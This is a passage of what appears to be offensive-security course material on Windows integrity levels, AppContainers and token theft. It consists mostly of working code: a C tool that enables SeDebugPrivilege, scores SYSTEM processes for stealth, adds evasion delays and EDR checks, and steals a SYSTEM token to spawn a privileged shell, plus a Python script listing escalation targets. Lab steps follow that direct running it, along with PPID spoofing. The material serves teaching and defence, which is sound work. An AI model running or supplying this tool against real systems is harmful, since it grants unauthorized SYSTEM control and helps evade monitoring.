BOOL IsProcessProtected(DWORD pid) {
    // Check if process is protected - simplified check
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return TRUE;  // Assume protected if can't open

    BOOL protected = FALSE;

    // Try to open with more access - if fails, likely protected
    HANDLE hTestProcess = OpenProcess(PROCESS_VM_READ, FALSE, pid);
    if (!hTestProcess) {
        protected = TRUE;
    } else {
        CloseHandle(hTestProcess);
    }

    CloseHandle(hProcess);
    return protected;
}

double GetProcessCPUUsage(DWORD pid) {
    // Get CPU usage for process selection (avoid high CPU processes)
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return 100.0;  // Assume high usage

    // Simple CPU check
    FILETIME creation_time, exit_time, kernel_time, user_time;
    if (GetProcessTimes(hProcess, &creation_time, &exit_time, &kernel_time, &user_time)) {
        ULARGE_INTEGER kernel, user;
        kernel.LowPart = kernel_time.dwLowDateTime;
        kernel.HighPart = kernel_time.dwHighDateTime;
        user.LowPart = user_time.dwLowDateTime;
        user.HighPart = user_time.dwHighDateTime;

        double cpu_time = (kernel.QuadPart + user.QuadPart) / 10000000.0;

        CloseHandle(hProcess);
        return cpu_time;
    }

    CloseHandle(hProcess);
    return 50.0;
}

VOID EnumerateTargetProcesses() {
    printf("[*] Enumerating potential SYSTEM processes...\n");

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    g_target_count = 0;

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            // Check if process runs as SYSTEM
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
            if (!hProcess) continue;

            HANDLE hToken;
            if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                DWORD token_size = 0;
                GetTokenInformation(hToken, TokenUser, NULL, 0, &token_size);

                if (token_size > 0) {
                    TOKEN_USER* token_user = (TOKEN_USER*)malloc(token_size);
                    if (GetTokenInformation(hToken, TokenUser, token_user, token_size, &token_size)) {
                        LPWSTR sid_string;
                        if (ConvertSidToStringSidW(token_user->User.Sid, &sid_string)) {
                            if (wcsstr(sid_string, L"S-1-5-18")) {  // SYSTEM SID
                                if (g_target_count < 32) {
                                    g_targets[g_target_count].pid = pe32.th32ProcessID;
                                    wcscpy_s(g_targets[g_target_count].name, 256, pe32.szExeFile);

                                    // Get session ID via ProcessIdToSessionId
                                    DWORD session_id = 0;
                                    ProcessIdToSessionId(pe32.th32ProcessID, &session_id);
                                    g_targets[g_target_count].session_id = session_id;

                                    g_targets[g_target_count].is_protected = IsProcessProtected(pe32.th32ProcessID);
                                    g_targets[g_target_count].cpu_usage = GetProcessCPUUsage(pe32.th32ProcessID);

                                    // Mark critical processes
                                    g_targets[g_target_count].is_critical =
                                        (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0) ||
                                        (_wcsicmp(pe32.szExeFile, L"csrss.exe") == 0) ||
                                        (_wcsicmp(pe32.szExeFile, L"smss.exe") == 0);

                                    g_target_count++;
                                }
                            }
                            LocalFree(sid_string);
                        }
                    }
                    free(token_user);
                }
                CloseHandle(hToken);
            }
            CloseHandle(hProcess);

        } while (Process32NextW(snapshot, &pe32) && g_target_count < 32);
    }

    CloseHandle(snapshot);

    // Display targets with analysis
    printf("[+] Found %d potential targets:\n", g_target_count);
    for (int i = 0; i < g_target_count; i++) {
        wprintf(L"    [%d] %s (PID: %d, Session: %d)\n",
               i, g_targets[i].name, g_targets[i].pid, g_targets[i].session_id);
        printf("         Protected: %s, Critical: %s, CPU: %.1f%%\n",
               g_targets[i].is_protected ? "YES" : "NO",
               g_targets[i].is_critical ? "YES" : "NO",
               g_targets[i].cpu_usage);
    }
    printf("\n");
}

DWORD SelectOptimalTarget() {
    // Score-based target selection
    double best_score = -1.0;
    int best_target = -1;

    for (int i = 0; i < g_target_count; i++) {
        double score = 0.0;

        // Prefer non-protected processes
        if (!g_targets[i].is_protected) score += 100;

        // Prefer non-critical processes
        if (!g_targets[i].is_critical) score += 50;

        // Prefer low CPU usage
        score += (100.0 - g_targets[i].cpu_usage);

        // PREFER session 1 (user session) over session 0 for token access
        if (g_targets[i].session_id == 1) score += 50;
        else if (g_targets[i].session_id == 0) score += 25;

        // Penalty for common targets that might be monitored
        if (_wcsicmp(g_targets[i].name, L"lsass.exe") == 0) score -= 30;
        if (_wcsicmp(g_targets[i].name, L"services.exe") == 0) score -= 20;

        // Bonus for winlogon (usually accessible)
        if (_wcsicmp(g_targets[i].name, L"winlogon.exe") == 0) score += 30;

        if (score > best_score) {
            best_score = score;
            best_target = i;
        }
    }

    if (best_target >= 0) {
        wprintf(L"[*] Selected optimal target: %s (PID: %d, Score: %.1f)\n",
               g_targets[best_target].name, g_targets[best_target].pid, best_score);
        return g_targets[best_target].pid;
    }

    return 0;
}

BOOL EnableDebugPrivilegeStealth() {
    printf("[*] Enabling SeDebugPrivilege with stealth...\n");

    // Add delay based on stealth level
    if (g_opsec.stealth_level > 1) {
        Sleep(g_opsec.delay_factor);
    }

    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[-] Failed to open process token\n");
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hToken);

    if (result && (err != ERROR_NOT_ALL_ASSIGNED)) {
        printf("[+] SeDebugPrivilege enabled\n");
        return TRUE;
    }

    printf("[-] Failed to enable SeDebugPrivilege\n");
    return FALSE;
}

BOOL StealTokenWithStealth(DWORD targetPid, const char* cmdLine) {
    printf("[*] Initiating stealthy token theft from PID %d...\n", targetPid);

    // Add random delay for stealth
    if (g_opsec.stealth_level > 1) {
        Sleep(g_opsec.delay_factor + (rand() % 1000));
    }

    // Step 1: Open target process with maximum access
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        // Try with less access
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, targetPid);
        if (!hProcess) {
            printf("[-] Failed to open target process: %d\n", GetLastError());
            return FALSE;
        }
    }

    printf("[+] Opened target process\n");

    // Step 2: Get process token with all necessary rights
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] Failed to open process token: %d (trying different target)\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Opened token from PID %d\n", targetPid);

    // Step 3: Duplicate token
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenPrimary, &hDupToken)) {
        printf("[-] Failed to duplicate token: %d\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Token duplicated successfully\n");

    // Step 4: Create process with stolen token
    STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = L"Winsta0\\Default";
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    PROCESS_INFORMATION pi = {0};

    wchar_t cmdBuf[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, cmdLine, -1, cmdBuf, MAX_PATH);

    BOOL success = CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE,
                                         NULL, cmdBuf, 0,
                                         NULL, NULL, &si, &pi);

    if (success) {
        printf("[+] SYSTEM process created with PID: %d\n", pi.dwProcessId);
        printf("[*] A new SYSTEM cmd.exe window should have opened\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        // Fallback method
        printf("[*] Primary method failed (%d), trying CreateProcessAsUser...\n", GetLastError());

        success = CreateProcessAsUserW(hDupToken, NULL, cmdBuf, NULL, NULL,
                                      FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
        if (success) {
            printf("[+] SYSTEM process created via fallback, PID: %d\n", pi.dwProcessId);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            printf("[-] All token theft methods failed: %d\n", GetLastError());
        }
    }

    // Cleanup
    if (g_opsec.stealth_level > 1) {
        Sleep(g_opsec.delay_factor / 2);
    }

    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return success;
}

int main() {
    // Initialize random seed for delays
    srand(GetTickCount());

    // Step 1: OPSEC assessment
    InitializeOPSEC();

    // Step 2: Enable debug privilege with stealth
    if (!EnableDebugPrivilegeStealth()) {
        printf("[-] Must run as Administrator with UAC elevation\n");
        return 1;
    }

    // Step 3: Enumerate and analyze potential targets
    EnumerateTargetProcesses();

    if (g_target_count == 0) {
        printf("[-] No suitable SYSTEM processes found\n");
        return 1;
    }

    // Step 4: Select optimal target based on OPSEC considerations
    DWORD targetPid = SelectOptimalTarget();
    if (targetPid == 0) {
        printf("[-] No optimal target selected\n");
        return 1;
    }

    // Step 5: Execute stealthy token theft with retry
    printf("\n[*] Executing stealthy token theft...\n");

    BOOL success = FALSE;
    int attempts = 0;
    int max_attempts = 5;

    while (!success && attempts < max_attempts && attempts < g_target_count) {
        // Try different targets if first one fails
        DWORD tryPid = (attempts == 0) ? targetPid : g_targets[attempts].pid;

        if (attempts > 0) {
            wprintf(L"[*] Trying alternative target: %s (PID: %d)\n",
                   g_targets[attempts].name, tryPid);
        }

        success = StealTokenWithStealth(tryPid, "cmd.exe");
        attempts++;

        if (!success && attempts < max_attempts) {
            Sleep(500);  // Brief delay between attempts
        }
    }

    if (success) {
        printf("\n[+] Token theft completed successfully after %d attempt(s)\n", attempts);
        printf("[*] Check for new SYSTEM command prompt\n");

        if (g_opsec.is_edr_present) {
            printf("[!] EDR detected - monitor for alerts\n");
        }
    } else {
        printf("\n[-] Token theft failed after %d attempts\n", attempts);
        printf("[*] This may indicate:\n");
        printf("    - Protected processes (PPL)\n");
        printf("    - Insufficient privileges\n");
        printf("    - Security software blocking access\n");
        return 1;
    }

    printf("\n[*] Execution completed - exiting cleanly\n");
    return 0;
}
```

### Token & Sandbox Analysis

```python
#!/usr/bin/env python3
"""
token_sandbox_analyzer.py
Uses ctypes for direct Win32 API calls

Run as admin for full analysis. Works from both attacker's Python or
a compromised host with Python available.
"""

import ctypes
import ctypes.wintypes as wt
import os
import sys
import subprocess
import json
from enum import IntEnum

# --- Constants ---
TOKEN_QUERY = 0x0008
TOKEN_DUPLICATE = 0x0002
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_IMPERSONATE = 0x0004
TOKEN_ADJUST_PRIVILEGES = 0x0020
PROCESS_QUERY_INFORMATION = 0x0400
SE_PRIVILEGE_ENABLED = 0x00000002
TokenIntegrityLevel = 25
TokenPrivileges = 3
TokenUser = 1
TokenIsAppContainer = 29

class IntegrityLevel(IntEnum):
    UNTRUSTED = 0x0000
    LOW = 0x1000
    MEDIUM = 0x2000
    MEDIUM_PLUS = 0x2100
    HIGH = 0x3000
    SYSTEM = 0x4000
    PROTECTED = 0x5000

# --- Structures ---
class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wt.DWORD), ("HighPart", wt.LONG)]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", wt.DWORD)]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", wt.DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES * 64)
    ]

class SID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Sid", ctypes.c_void_p), ("Attributes", wt.DWORD)]

class TOKEN_MANDATORY_LABEL(ctypes.Structure):
    _fields_ = [("Label", SID_AND_ATTRIBUTES)]

# --- API References ---
advapi32 = ctypes.windll.advapi32
kernel32 = ctypes.windll.kernel32

def get_integrity_level(pid=None):
    """Get integrity level of a process (default: current process)."""
    if pid is None:
        # Get real handle to current process
        hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, kernel32.GetCurrentProcessId())
        if not hProcess:
            return None, f"OpenProcess failed: {ctypes.GetLastError()}"
        close_process = True
    else:
        hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
        if not hProcess:
            return None, f"OpenProcess failed: {ctypes.GetLastError()}"
        close_process = True

    hToken = wt.HANDLE()
    if not advapi32.OpenProcessToken(hProcess, TOKEN_QUERY, ctypes.byref(hToken)):
        err = ctypes.GetLastError()
        if close_process:
            kernel32.CloseHandle(hProcess)
        return None, f"OpenProcessToken failed: {err}"

    # Query integrity level
    dwSize = wt.DWORD()
    advapi32.GetTokenInformation(hToken, TokenIntegrityLevel, None, 0, ctypes.byref(dwSize))

    buf = ctypes.create_string_buffer(dwSize.value)
    if advapi32.GetTokenInformation(hToken, TokenIntegrityLevel, buf, dwSize, ctypes.byref(dwSize)):
        pLabel = ctypes.cast(buf, ctypes.POINTER(TOKEN_MANDATORY_LABEL))
        pSid = pLabel.contents.Label.Sid

        # Get the last sub-authority (the integrity level RID)
        advapi32.GetSidSubAuthorityCount.restype = ctypes.POINTER(ctypes.c_ubyte)
        advapi32.GetSidSubAuthorityCount.argtypes = [ctypes.c_void_p]
        pCount = advapi32.GetSidSubAuthorityCount(pSid)
        count = pCount.contents.value

        advapi32.GetSidSubAuthority.restype = ctypes.POINTER(wt.DWORD)
        advapi32.GetSidSubAuthority.argtypes = [ctypes.c_void_p, wt.DWORD]
        pRid = advapi32.GetSidSubAuthority(pSid, count - 1)
        rid = pRid.contents.value

        try:
            level_name = IntegrityLevel(rid).name
        except ValueError:
            level_name = f"UNKNOWN(0x{rid:04X})"

        kernel32.CloseHandle(hToken)
        if close_process:
            kernel32.CloseHandle(hProcess)
        return rid, level_name

    kernel32.CloseHandle(hToken)
    if close_process:
        kernel32.CloseHandle(hProcess)
    return None, "GetTokenInformation failed"

def get_privileges():
    """Enumerate privileges of current process token."""
    # Get real handle to current process
    hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, kernel32.GetCurrentProcessId())
    if not hProcess:
        return []

    hToken = wt.HANDLE()
    if not advapi32.OpenProcessToken(hProcess, TOKEN_QUERY, ctypes.byref(hToken)):
        kernel32.CloseHandle(hProcess)
        return []

    dwSize = wt.DWORD()
    advapi32.GetTokenInformation(hToken, TokenPrivileges, None, 0, ctypes.byref(dwSize))

    buf = ctypes.create_string_buffer(dwSize.value)
    advapi32.GetTokenInformation(hToken, TokenPrivileges, buf, dwSize, ctypes.byref(dwSize))

    tp = ctypes.cast(buf, ctypes.POINTER(TOKEN_PRIVILEGES))
    privileges = []

    for i in range(min(tp.contents.PrivilegeCount, 64)):
        name_buf = ctypes.create_string_buffer(256)
        name_len = wt.DWORD(256)
        advapi32.LookupPrivilegeNameA(
            None,
            ctypes.byref(tp.contents.Privileges[i].Luid),
            name_buf,
            ctypes.byref(name_len)
        )
        attrs = tp.contents.Privileges[i].Attributes
        enabled = bool(attrs & SE_PRIVILEGE_ENABLED)
        privileges.append({
            "name": name_buf.value.decode(),
            "enabled": enabled
        })

    kernel32.CloseHandle(hToken)
    kernel32.CloseHandle(hProcess)
    return privileges

def check_appcontainer():
    """Check if current process is in an AppContainer."""
    hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, kernel32.GetCurrentProcessId())
    if not hProcess:
        return False

    hToken = wt.HANDLE()
    if not advapi32.OpenProcessToken(hProcess, TOKEN_QUERY, ctypes.byref(hToken)):
        kernel32.CloseHandle(hProcess)
        return False

    is_ac = wt.DWORD()
    dwSize = wt.DWORD(ctypes.sizeof(is_ac))
    advapi32.GetTokenInformation(
        hToken, TokenIsAppContainer,
        ctypes.byref(is_ac), dwSize, ctypes.byref(dwSize)
    )

    kernel32.CloseHandle(hToken)
    kernel32.CloseHandle(hProcess)
    return bool(is_ac.value)

def enumerate_system_processes():
    """Find SYSTEM processes suitable for token theft."""
    try:
        # Try PowerShell with full path
        ps_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        if not os.path.exists(ps_path):
            ps_path = "powershell.exe"

        result = subprocess.run(
            [ps_path, "-NoProfile", "-Command",
             "Get-Process | Select-Object Id,ProcessName | ConvertTo-Json"],
            capture_output=True, text=True, timeout=10
        )

        targets = ["winlogon", "lsass", "services", "csrss", "smss"]
        found = []

        procs = json.loads(result.stdout)
        for proc in procs:
            name = proc.get("ProcessName", "").lower()
            if name in targets:
                found.append({"pid": proc["Id"], "name": proc["ProcessName"]})

        return found
    except (json.JSONDecodeError, TypeError, FileNotFoundError, subprocess.TimeoutExpired):
        # Fallback: use tasklist
        try:
            result = subprocess.run(
                ["tasklist", "/FO", "CSV", "/NH"],
                capture_output=True, text=True, timeout=10
            )

            targets = ["winlogon.exe", "lsass.exe", "services.exe", "csrss.exe", "smss.exe"]
            found = []

            for line in result.stdout.strip().split('\n'):
                parts = line.strip('"').split('","')
                if len(parts) >= 2:
                    name = parts[0].lower()
                    if name in targets:
                        try:
                            pid = int(parts[1])
                            found.append({"pid": pid, "name": parts[0]})
                        except ValueError:
                            pass

            return found
        except:
            return []

def sandbox_assessment():
    """Complete sandbox and token security assessment."""
    print("=" * 60)
    print("  SANDBOX & TOKEN SECURITY ASSESSMENT")
    print("=" * 60)

    # Integrity level
    rid, level = get_integrity_level()
    print(f"\n[*] Integrity Level: {level} (0x{rid:04X})" if rid else f"\n[-] {level}")

    # AppContainer
    is_ac = check_appcontainer()
    print(f"[*] AppContainer:    {'YES - SANDBOXED' if is_ac else 'No'}")

    # Privileges
    privs = get_privileges()
    offensive_privs = [
        "SeDebugPrivilege", "SeImpersonatePrivilege",
        "SeAssignPrimaryTokenPrivilege", "SeTcbPrivilege",
        "SeBackupPrivilege", "SeRestorePrivilege",
        "SeLoadDriverPrivilege", "SeTakeOwnershipPrivilege"
    ]

    print(f"\n[*] Privileges ({len(privs)} total):")
    for p in privs:
        marker = "***" if p["name"] in offensive_privs else "   "
        status = "ENABLED" if p["enabled"] else "disabled"
        print(f"  {marker} {p['name']:40s} [{status}]")

    # Attack path assessment
    print(f"\n{'=' * 60}")
    print("  ATTACK PATH ASSESSMENT")
    print(f"{'=' * 60}")

    priv_names = {p["name"] for p in privs}

    if rid and rid >= IntegrityLevel.HIGH:
        print("\n  [+] HIGH integrity - can attempt token theft from SYSTEM")
        if "SeDebugPrivilege" in priv_names:
            print("  [+] SeDebugPrivilege available - direct token theft possible")
            targets = enumerate_system_processes()
            if targets:
                print(f"  [+] SYSTEM process targets:")
                for t in targets:
                    print(f"      {t['name']} (PID {t['pid']})")
        else:
            print("  [-] SeDebugPrivilege missing - need to enable first")

    if "SeImpersonatePrivilege" in priv_names:
        print("  [+] SeImpersonatePrivilege present")
        print("      Note: Traditional Potato attacks don't work on Windows 11 24H2")
        print("      Reason: EFSRPC service not installed, enhanced COM security")
        print("      Alternative: Token theft from SYSTEM processes")
    elif "SeAssignPrimaryTokenPrivilege" in priv_names:
        print("  [+] SeAssignPrimaryToken - Token assignment attack viable")

    if rid and rid <= IntegrityLevel.LOW:
        print("\n  [!] LOW integrity - limited write access")
        print("      Writable: %LOCALAPPDATA%\\Low, %TEMP%\\Low")
        print("      Readable: Most user files (No-Write-Up only)")
        print("      Escape:   Exploit Medium-IL service or COM interface")

    if is_ac:
        print("\n  [!] APPCONTAINER - heavily sandboxed!")
        print("      Escape requires: Broker exploit, COM abuse, or kernel vuln")
        print("      Next step: Enumerate available COM objects and broker interfaces")

    print(f"\n{'=' * 60}")

if __name__ == "__main__":
    if sys.platform != "win32":
        print("[-] This tool requires Windows")
        sys.exit(1)
    sandbox_assessment()
```

### Practical Exercise

**Lab 4.1: Integrity Level Analysis**

1. Compile and run `integrity_level_tool.c` to analyze current process IL
2. Observe the automated Low-IL process spawn and restriction testing
3. Compare Medium-IL vs Low-IL write capabilities to user profile and registry
4. Document which locations are writable from Low IL (owner rights override IL)

**Lab 4.2: AppContainer Sandbox Testing**

1. Compile and run `appcontainer_analysis.c` to create an AppContainer process
2. From the spawned AppContainer cmd.exe, attempt file access: `type %USERPROFILE%\Desktop\test.txt`
3. Try network access: `ping 8.8.8.8` (should fail without internetClient capability)
4. Use Process Explorer to verify AppContainer SID in the process token

**Lab 4.3: Token Theft from SYSTEM Processes**

1. Run `token_sandbox_analyzer.py` to enumerate SYSTEM processes and assess privileges
2. Compile and run `token_stealth.exe` as Administrator to perform automated token theft
3. Verify SYSTEM access in the spawned cmd.exe: `whoami` and `whoami /priv`
4. Observe OPSEC features: EDR detection, target scoring, stealth delays

**Lab 4.4: Token Manipulation Techniques**

1. Compile and run `token_manipulation.c` to inspect your current token
2. Use option [1] to steal a token from another process (try different PIDs)
3. Use option [2] to demonstrate PPID spoofing with a target parent PID
4. Verify spoofed parent in Process Explorer's process tree view

**Lab 4.5: Modern Windows 11 24H2 Reality Check**

1. Attempt to locate EFSRPC service: `sc query efsrpc` (not found on 24H2)
2. Verify traditional Potato attacks fail due to missing EFSRPC
3. Confirm token theft from SYSTEM processes is the viable alternative
4. Document why SeDebugPrivilege + token theft replaced Potato techniques

### Key Takeaways

- **Integrity levels are the first sandbox layer** - but No-Write-Up only by default (read access preserved)
- **AppContainers are significantly stronger** than IL alone - default deny for network, files, IPC
- **Token theft from SYSTEM processes** is the primary privilege escalation path on modern Windows
- **Traditional Potato attacks don't work on Windows 11 24H2** - EFSRPC service removed, enhanced COM security
- **SeDebugPrivilege enables direct token theft** - target selection matters (avoid protected processes)
- **PPID spoofing bypasses monitoring** - process tree analysis becomes unreliable
- **Process attributes control child security** - mitigation policy, AC assignment, parent spoofing
- **Broker process bugs** are the main AppContainer escape vector (critical for Week 12)
- **OPSEC considerations** - EDR detection, target scoring, timing delays affect success rates

### Discussion Questions

1. Why does Windows default to No-Write-Up rather than No-Read-Up for integrity levels?
2. How does AppContainer isolation compare to Linux namespaces and seccomp-bpf?
3. Why did Microsoft remove EFSRPC from Windows 11 24H2, and what does this tell us about the Potato attack family's impact?
4. How would you detect token theft from SYSTEM processes in a SOC environment? What telemetry would you monitor?
5. What makes broker processes such an attractive attack target for AppContainer escapes?
6. Why is target selection important for token theft? What makes winlogon.exe a better target than lsass.exe from an OPSEC perspective?
7. How does PPID spoofing defeat parent-child process relationship monitoring? What alternative detection methods exist?
8. On Windows 11 24H2, if SeImpersonatePrivilege is available but Potato attacks fail, what's the most reliable privilege escalation path?

